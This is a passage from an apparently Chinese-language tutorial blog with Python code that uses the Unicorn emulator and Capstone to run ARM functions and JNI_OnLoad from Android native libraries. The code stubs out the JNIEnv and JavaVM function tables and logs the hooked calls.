class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unicorn.arm_const</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印寄存器纸</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">      </span><br><span class="line"><span class="comment">#输出指针所指向的地址的字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address&gt;=<span class="number">0</span> <span class="keyword">and</span> address&lt;=<span class="number">300</span>*<span class="number">4</span>:</span><br><span class="line">        index=address/<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">676</span>/<span class="number">4</span>:  <span class="comment">#看在jninativeinterface的位置</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars-----------------&quot;</span>)</span><br><span class="line">            r0value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            r2value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R2)</span><br><span class="line">            content=readstring(mu,r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0,r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value)+<span class="string">&#x27;-----&#x27;</span>+content+<span class="string">&#x27;-----&#x27;</span>+<span class="built_in">str</span>(r2value))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars over-----------------&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">668</span>/<span class="number">4</span>:  <span class="comment">#看在jninativeinterface的位置</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF-----------------&quot;</span>)</span><br><span class="line">            r0value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            content = readstring(mu, r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value) + <span class="string">&#x27;-----&#x27;</span> + content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF over-----------------&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call jni interface------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_jni</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse04.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x424</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x424</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line"></span><br><span class="line">    JNIFUNCTIONLISTBASE=<span class="number">0x0</span></span><br><span class="line">    JNIFUNCTIONLISTSIZE=<span class="number">0x1000</span></span><br><span class="line">    JNINATIVEINTERFACE=<span class="number">301</span></span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>, <span class="number">0x1000</span>)</span><br><span class="line">    <span class="comment">#初始化jni接口中每个函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">300</span>,<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#push &#123;lr&#125;  pop &#123;pc&#125;</span></span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>+JNIFUNCTIONLISTBASE,<span class="string">b&quot;\x00\xb5\x00\xbd&quot;</span>)</span><br><span class="line">    <span class="comment">#初始化jninativeinterface结构体</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>,<span class="number">600</span>,<span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>,struct.pack(<span class="string">&quot;I&quot;</span>,(i-<span class="number">300</span>)*<span class="number">4</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="comment">#初始化jnienv* env</span></span><br><span class="line">    jnienv_pointer=<span class="number">601</span>*<span class="number">4</span></span><br><span class="line">    mu.mem_write(jnienv_pointer,struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">300</span>*<span class="number">4</span>))  <span class="comment">#env指针</span></span><br><span class="line"></span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address, CODE)</span><br><span class="line">    mu.mem_map(address+size+<span class="number">0x1000</span>,<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># bx lr 消除__android_log_print干扰</span></span><br><span class="line">    mu.mem_write(address+<span class="number">0x4f8</span>,<span class="string">b&#x27;\x1e\xff\x2f\xe1&#x27;</span>)   </span><br><span class="line">    <span class="comment">#或者 mu.mem_write(address +0x448, b&#x27;\x00\xbf\x00\xbf&#x27;)</span></span><br><span class="line">    </span><br><span class="line">    mu.mem_write(address+size+<span class="number">0x1000</span>,<span class="string">b&#x27;imtestfromjni&#x27;</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,jnienv_pointer)  <span class="comment">#存放指針地址</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x0</span>)  <span class="comment">#没用到 设0即可</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R2,address+size+<span class="number">0x1000</span>) <span class="comment">#jstring</span></span><br><span class="line">    sp = address + size - <span class="number">16</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP, sp)</span><br><span class="line"></span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code,<span class="literal">None</span>,<span class="number">0</span>,<span class="number">300</span>*<span class="number">4</span>) <span class="comment">#对指定范围 进行hook</span></span><br><span class="line">    </span><br><span class="line">    addrstart = address + <span class="number">0x0424</span> + <span class="number">1</span></span><br><span class="line">    addrend = address + <span class="number">0x045c</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> datetime</span><br><span class="line">        starttime=datetime.datetime.now()</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;emulat over&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="comment">#打印最后的返回值字符串</span></span><br><span class="line">        r0value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">        result=readstring(mu,r0value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;result--&gt;&quot;</span>+result)</span><br><span class="line">        endtime=datetime.datetime.now()</span><br><span class="line">        <span class="built_in">print</span>(endtime-starttime)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    call_jni()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第五课时">第五课时</h2><h3 id="Unicorn模拟调用JNI-Onload，">Unicorn模拟调用JNI_Onload，</h3><p>其中会涉及到Javavm，具体实现和Jnienv差不多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unicorn.arm_const</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address&gt;=<span class="number">700</span>*<span class="number">4</span> <span class="keyword">and</span> address&lt;=<span class="number">710</span>*<span class="number">4</span>:</span><br><span class="line">        index=(address-<span class="number">700</span>*<span class="number">4</span>)/<span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call javavm function-----------&quot;</span>+<span class="built_in">str</span>(index))</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">6</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call javavm-&gt;GetEnv-----------&quot;</span> + <span class="built_in">str</span>(index))</span><br><span class="line">            r1value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)  <span class="comment">#读出来env指针</span></span><br><span class="line">            mu.mem_write(r1value,struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">601</span>*<span class="number">4</span>))          <span class="comment">#让env的地址为自定义的601*4 这样就可以指向定义的env结构体</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address&gt;=<span class="number">0</span> <span class="keyword">and</span> address&lt;=<span class="number">300</span>*<span class="number">4</span>:</span><br><span class="line">        index=address/<span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call jnienv funciton-----------&quot;</span>+<span class="built_in">str</span>(index))</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">6</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jnienv FindClass is called&quot;</span>)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            classname=readstring(mu,r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jnienv FindClass:&quot;</span>+classname)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0,<span class="number">666</span>)</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">215</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jnienv RegisterNatives:&quot;</span>)</span><br><span class="line">            r0value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            r2value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R2)</span><br><span class="line">            <span class="comment"># funcname_bytearray=mu.mem_read(r2value,4)</span></span><br><span class="line">            <span class="comment"># funcname_addr=struct.unpack(&quot;I&quot;,funcname_bytearray)</span></span><br><span class="line">            <span class="comment"># funcname=readstring(mu,funcname_addr)</span></span><br><span class="line">            r3value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R3)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;env:&quot;</span>+<span class="built_in">str</span>(r0value)+<span class="string">&quot;---jclass&quot;</span>+<span class="built_in">str</span>(r1value)+<span class="string">&quot;---&quot;</span>+<span class="built_in">str</span>(r2value)+<span class="string">&quot;---&quot;</span>+<span class="built_in">str</span>(r3value)+<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">676</span>/<span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars-----------------&quot;</span>)</span><br><span class="line">            r0value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            r2value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R2)</span><br><span class="line">            content=readstring(mu,r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0,r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value)+<span class="string">&#x27;-----&#x27;</span>+content+<span class="string">&#x27;-----&#x27;</span>+<span class="built_in">str</span>(r2value))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars over-----------------&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">668</span>/<span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF-----------------&quot;</span>)</span><br><span class="line">            r0value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            content = readstring(mu, r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value) + <span class="string">&#x27;-----&#x27;</span> + content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF over-----------------&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call jni interface------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_block</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_blocak------------------------------------------------------&quot;</span>)</span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[hook_blocak_addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="comment">#void (*uc_cb_hookmem_t)(uc_engine *uc, uc_mem_type type,uint64_t address, int size, int64_t value, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#映射</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#返回true 模拟器继续往下面执行代码  False则相反</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_jni</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;unicorn05.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0xc00</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0xc00</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line"></span><br><span class="line">    JNIFUNCTIONLISTBASE=<span class="number">0x0</span></span><br><span class="line">    JNIFUNCTIONLISTSIZE=<span class="number">0x1000</span></span><br><span class="line">    JNINATIVEINTERFACE=<span class="number">301</span>   <span class="comment">#jni函数位置</span></span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>, <span class="number">0x1000</span>)</span><br><span class="line">    <span class="comment">#初始化jni接口中每个函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">300</span>,<span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>+JNIFUNCTIONLISTBASE,<span class="string">b&quot;\x00\xb5\x00\xbd&quot;</span>)</span><br><span class="line">    <span class="comment">#初始化jninativeinterface结构体</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>,<span class="number">600</span>,<span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>,struct.pack(<span class="string">&quot;I&quot;</span>,(i-<span class="number">300</span>)*<span class="number">4</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="comment">#初始化jnienv* env  指向jninativeinterface首部</span></span><br><span class="line">    jnienv_pointer=<span class="number">601</span>*<span class="number">4</span></span><br><span class="line">    mu.mem_write(jnienv_pointer,struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">300</span>*<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">    JAVAVMFUNCTIONLISTBASE=<span class="number">700</span>*<span class="number">4</span></span><br><span class="line">    <span class="comment"># 初始化jni接口中每个函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i * <span class="number">4</span> + JAVAVMFUNCTIONLISTBASE, <span class="string">b&quot;\x00\xb5\x00\xbd&quot;</span>)</span><br><span class="line">    <span class="comment"># 初始化jniinvokeinterface结构体</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i * <span class="number">4</span>+JAVAVMFUNCTIONLISTBASE+<span class="number">40</span>, struct.pack(<span class="string">&quot;I&quot;</span>, i * <span class="number">4</span> + JAVAVMFUNCTIONLISTBASE+ <span class="number">1</span>)) <span class="comment">#和前面对应</span></span><br><span class="line">    <span class="comment"># 初始化javavm *vm 指向javavm结构体的首部</span></span><br><span class="line">    javavm_pointer = <span class="number">700</span> * <span class="number">4</span>+<span class="number">80</span></span><br><span class="line">    mu.mem_write(javavm_pointer, struct.pack(<span class="string">&quot;I&quot;</span>, JAVAVMFUNCTIONLISTBASE+<span class="number">40</span>))</span><br><span class="line"></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address, CODE)</span><br><span class="line">    mu.mem_map(address+size+<span class="number">0x1000</span>,<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,javavm_pointer)  <span class="comment">#存放指針地址</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x0</span>)</span><br><span class="line">    sp = address + size - <span class="number">16</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP, sp)</span><br><span class="line"></span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    <span class="comment">#mu.hook_add(UC_HOOK_MEM_WRITE,hook_mem)</span></span><br><span class="line">    addrstart = address + <span class="number">0x0c00</span> + <span class="number">1</span></span><br><span class="line">    addrend = address + <span class="number">0x0c66</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> datetime</span><br><span class="line">        starttime=datetime.datetime.now()</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;emulat over&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        endtime = datetime.datetime.now()</span><br><span class="line">        <span class="built_in">print</span>(endtime-starttime)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    call_jni()</span><br></pre></td></tr></table></figure><h2 